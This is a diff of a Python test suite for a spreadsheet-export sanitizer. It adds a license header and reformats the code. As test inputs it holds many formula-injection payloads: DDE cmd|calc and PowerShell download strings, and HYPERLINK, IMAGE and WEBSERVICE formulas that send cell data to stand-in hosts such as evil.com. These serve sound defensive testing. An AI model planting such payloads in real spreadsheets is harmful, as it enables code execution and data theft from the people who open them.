@@ -1,3 +1,25 @@
+# MIT License
+#
+# Copyright (c) 2026 Ganesh Kambli
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+
 import inspect
 import io
 import os
@@ -78,7 +100,6 @@ def test_generate_tsv_matrix_stream():
     full_tsv = "".join(chunks)
     reconstructed_df = pd.read_csv(io.StringIO(full_tsv), sep="\t", index_col=0)
     pd.testing.assert_frame_equal(df, reconstructed_df, check_names=False)
-
 
 
 def test_build_similarity_workbook_metadata_properties():
@@ -285,11 +306,11 @@ class TestSanitizeSpreadsheetValueControlCharacters:
             "\x06",  # ACK
             "\x07",  # BEL
             "\x08",  # BS
-            "\t",    # TAB (0x09)
-            "\n",    # LF (0x0A)
+            "\t",  # TAB (0x09)
+            "\n",  # LF (0x0A)
             "\x0b",  # VT (0x0B)
             "\x0c",  # FF (0x0C)
-            "\r",    # CR (0x0D)
+            "\r",  # CR (0x0D)
             "\x0e",  # SO
             "\x0f",  # SI
             "\x10",  # DLE
@@ -314,7 +335,9 @@ class TestSanitizeSpreadsheetValueControlCharacters:
             for trigger in triggers:
                 raw_val = f"{ctrl}{trigger}1+1"
                 sanitized = sanitize_spreadsheet_value(raw_val)
-                assert sanitized.startswith("'"), f"Failed for ctrl {repr(ctrl)} and trigger {trigger}"
+                assert sanitized.startswith(
+                    "'"
+                ), f"Failed for ctrl {repr(ctrl)} and trigger {trigger}"
                 assert sanitized == f"'{trigger}1+1"
                 assert ctrl not in sanitized
 
@@ -347,11 +370,17 @@ class TestSanitizeSpreadsheetValueControlCharacters:
         dde_payloads = [
             ("\r\n=cmd|'/c calc'!A0", "'=cmd|'/c calc'!A0"),
             ("\t\r@SUM(1+1)*cmd|' /C calc'!A0", "'@SUM(1+1)*cmd|' /C calc'!A0"),
-            ("\x1b+HYPERLINK(\"http://malicious.com\",\"Click\")", "'+HYPERLINK(\"http://malicious.com\",\"Click\")"),
+            (
+                '\x1b+HYPERLINK("http://malicious.com","Click")',
+                '\'+HYPERLINK("http://malicious.com","Click")',
+            ),
             ("\x00\x01\x02=2+5+cmd|' /C calc'!A0", "'=2+5+cmd|' /C calc'!A0"),
             ("\r\n-10+20", "'-10+20"),
             ("\n\r+100", "'+100"),
-            ("\t@IMPORTDATA(\"http://malicious.com/data.csv\")", "'@IMPORTDATA(\"http://malicious.com/data.csv\")"),
+            (
+                '\t@IMPORTDATA("http://malicious.com/data.csv")',
+                '\'@IMPORTDATA("http://malicious.com/data.csv")',
+            ),
         ]
         for raw, expected in dde_payloads:
             sanitized = sanitize_spreadsheet_value(raw)
@@ -360,10 +389,10 @@ class TestSanitizeSpreadsheetValueControlCharacters:
 
     def test_sanitize_spreadsheet_value_embedded_control_characters_in_formula(self):
         """Verify embedded control characters inside formula body are also stripped."""
-        payload = "\r\n=HYPER\x00LINK(\"https://\r\nattacker.example\",\"Open\")"
+        payload = '\r\n=HYPER\x00LINK("https://\r\nattacker.example","Open")'
         sanitized = sanitize_spreadsheet_value(payload)
         assert sanitized.startswith("'")
-        assert sanitized == "'=HYPERLINK(\"https://attacker.example\",\"Open\")"
+        assert sanitized == '\'=HYPERLINK("https://attacker.example","Open")'
         assert "\x00" not in sanitized
         assert "\r" not in sanitized
         assert "\n" not in sanitized
@@ -426,20 +455,22 @@ class TestSanitizeSpreadsheetValueControlCharacters:
             "\n+2+5",
             "\r-SUM(1,2)",
             "\t@SUM(1,2)",
-            "\x00=HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click Me\")",
-            "\x1b=IMAGE(\"http://evil.com/leak?data=\"&A1)",
-            "\x0b=WEBSERVICE(\"http://evil.com?\"&A1)",
-            "\x0c=FILTERXML(WEBSERVICE(\"http://evil.com\"),\"//a\")",
-            "\r\n\t=EXEC(\"calc.exe\")",
-            "\x1f+CELL(\"contents\",A1)",
-            "\x1e-INFO(\"directory\")",
+            '\x00=HYPERLINK("http://evil.com?leak="&A1,"Click Me")',
+            '\x1b=IMAGE("http://evil.com/leak?data="&A1)',
+            '\x0b=WEBSERVICE("http://evil.com?"&A1)',
+            '\x0c=FILTERXML(WEBSERVICE("http://evil.com"),"//a")',
+            '\r\n\t=EXEC("calc.exe")',
+            '\x1f+CELL("contents",A1)',
+            '\x1e-INFO("directory")',
             "\x1d@MID(A1,1,5)",
             "\x00\r\n=cmd|'/C powershell -c (New-Object Net.WebClient).DownloadFile()'!'A1'",
         ]
 
         for vec in attack_vectors:
             sanitized = sanitize_spreadsheet_value(vec)
-            assert sanitized.startswith("'"), f"Vector was not prepended with quote: {vec}"
+            assert sanitized.startswith(
+                "'"
+            ), f"Vector was not prepended with quote: {vec}"
             # Ensure no control chars remained in sanitized text
             for c in range(32):
                 assert chr(c) not in sanitized, f"Found control char {c} in {sanitized}"
@@ -448,7 +479,7 @@ class TestSanitizeSpreadsheetValueControlCharacters:
         """Verify sanitize_spreadsheet_value neutralizes control character formula triggers across incident record dictionary fields."""
         raw_incident = {
             "incident_id": "\r\n=CMD|' /C calc'!A0",
-            "document_a": "\t+HYPERLINK(\"http://evil.com\",\"DocA\")",
+            "document_a": '\t+HYPERLINK("http://evil.com","DocA")',
             "document_b": "\x00-MALICIOUS_DOC.pdf",
             "similarity_score": 0.99,
             "severity_rank": "\x1b@HIGH",
@@ -461,11 +492,12 @@ class TestSanitizeSpreadsheetValueControlCharacters:
         }
 
         assert sanitized_incident["incident_id"] == "'=CMD|' /C calc'!A0"
-        assert sanitized_incident["document_a"] == "'+HYPERLINK(\"http://evil.com\",\"DocA\")"
+        assert (
+            sanitized_incident["document_a"] == '\'+HYPERLINK("http://evil.com","DocA")'
+        )
         assert sanitized_incident["document_b"] == "'-MALICIOUS_DOC.pdf"
         assert sanitized_incident["severity_rank"] == "'@HIGH"
         assert sanitized_incident["similarity_score"] == 0.99
-
 
     def test_sanitize_spreadsheet_value_empty_and_whitespace_only(self):
         """Verify handling of empty strings and strings consisting only of control characters."""
@@ -473,7 +505,9 @@ class TestSanitizeSpreadsheetValueControlCharacters:
         assert sanitize_spreadsheet_value("\r\n\t\x00") == ""
         assert sanitize_spreadsheet_value("   ") == "   "
         assert sanitize_spreadsheet_value("\r\n   ") == "   "
-        assert sanitize_spreadsheet_value("\r\n =1+1") == " =1+1"  # Starts with space after stripping control chars, so not formula trigger
+        assert (
+            sanitize_spreadsheet_value("\r\n =1+1") == " =1+1"
+        )  # Starts with space after stripping control chars, so not formula trigger
 
     def test_sanitize_spreadsheet_value_idempotency(self):
         """Verify idempotency: running sanitization multiple times maintains safety."""
@@ -508,9 +542,11 @@ class TestSanitizeSpreadsheetValueControlCharacters:
         assert "\r" not in sanitized
         assert "\n" not in sanitized
 
-    def test_sanitize_spreadsheet_value_custom_export_matrix_with_comment_truncation(self):
+    def test_sanitize_spreadsheet_value_custom_export_matrix_with_comment_truncation(
+        self,
+    ):
         """Verify long formula payloads (>60 chars) with control chars get properly sanitized in cell and comment."""
-        long_formula = "\r\n=HYPERLINK(\"https://attacker-domain-long-url-example.com/exploit/leak/session?token=secret1234567890\",\"Click Here\")"
+        long_formula = '\r\n=HYPERLINK("https://attacker-domain-long-url-example.com/exploit/leak/session?token=secret1234567890","Click Here")'
         df = pd.DataFrame(
             {long_formula: [0.88]},
             index=[long_formula],
@@ -543,21 +579,21 @@ class TestSanitizeSpreadsheetValueControlCharacters:
             ("\x02-3-3", "'-3-3"),
             ("\x03@SUM(A1:A5)", "'@SUM(A1:A5)"),
             ("\x04\t=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"),
-            ("\x05\r=HYPERLINK(\"http://test.com\")", "'=HYPERLINK(\"http://test.com\")"),
+            ('\x05\r=HYPERLINK("http://test.com")', '\'=HYPERLINK("http://test.com")'),
             ("\x06\n+AVERAGE(B1:B10)", "'+AVERAGE(B1:B10)"),
             ("\x07-MIN(C1:C10)", "'-MIN(C1:C10)"),
             ("\x08@MAX(D1:D10)", "'@MAX(D1:D10)"),
             ("\x0e=POWER(2,8)", "'=POWER(2,8)"),
             ("\x0f+CONCATENATE(A1,B1)", "'+CONCATENATE(A1,B1)"),
             ("\x10-STDEV(E1:E20)", "'-STDEV(E1:E20)"),
-            ("\x11@COUNTIF(F1:F10,\">0\")", "'@COUNTIF(F1:F10,\">0\")"),
+            ('\x11@COUNTIF(F1:F10,">0")', '\'@COUNTIF(F1:F10,">0")'),
             ("\x12=VLOOKUP(1,A:B,2,FALSE)", "'=VLOOKUP(1,A:B,2,FALSE)"),
             ("\x13+INDEX(A:A,1)", "'+INDEX(A:A,1)"),
-            ("\x14-MATCH(\"target\",A:A,0)", "'-MATCH(\"target\",A:A,0)"),
+            ('\x14-MATCH("target",A:A,0)', '\'-MATCH("target",A:A,0)'),
             ("\x15@OFFSET(A1,1,1)", "'@OFFSET(A1,1,1)"),
-            ("\x16=INDIRECT(\"A1\")", "'=INDIRECT(\"A1\")"),
-            ("\x17+CELL(\"type\",A1)", "'+CELL(\"type\",A1)"),
-            ("\x18-INFO(\"release\")", "'-INFO(\"release\")"),
+            ('\x16=INDIRECT("A1")', '\'=INDIRECT("A1")'),
+            ('\x17+CELL("type",A1)', '\'+CELL("type",A1)'),
+            ('\x18-INFO("release")', '\'-INFO("release")'),
             ("\x19@ISBLANK(A1)", "'@ISBLANK(A1)"),
             ("\x1a=ISERROR(A1)", "'=ISERROR(A1)"),
             ("\x1b+ISNUMBER(A1)", "'+ISNUMBER(A1)"),
@@ -567,7 +603,9 @@ class TestSanitizeSpreadsheetValueControlCharacters:
             ("\x1f+UPPER(A1)", "'+UPPER(A1)"),
         ],
     )
-    def test_sanitize_spreadsheet_value_control_char_parametrized(self, payload, expected):
+    def test_sanitize_spreadsheet_value_control_char_parametrized(
+        self, payload, expected
+    ):
         """Verify individual control character variants (0x00 - 0x1F) are stripped and escaped."""
         sanitized = sanitize_spreadsheet_value(payload)
         assert sanitized == expected
@@ -590,7 +628,3 @@ class TestSanitizeSpreadsheetValueControlCharacters:
         """Verify that standard safe strings without formula triggers remain untouched without apostrophe prefix."""
         assert sanitize_spreadsheet_value(safe_input) == safe_input
         assert not sanitize_spreadsheet_value(safe_input).startswith("'")
-
-
-
-
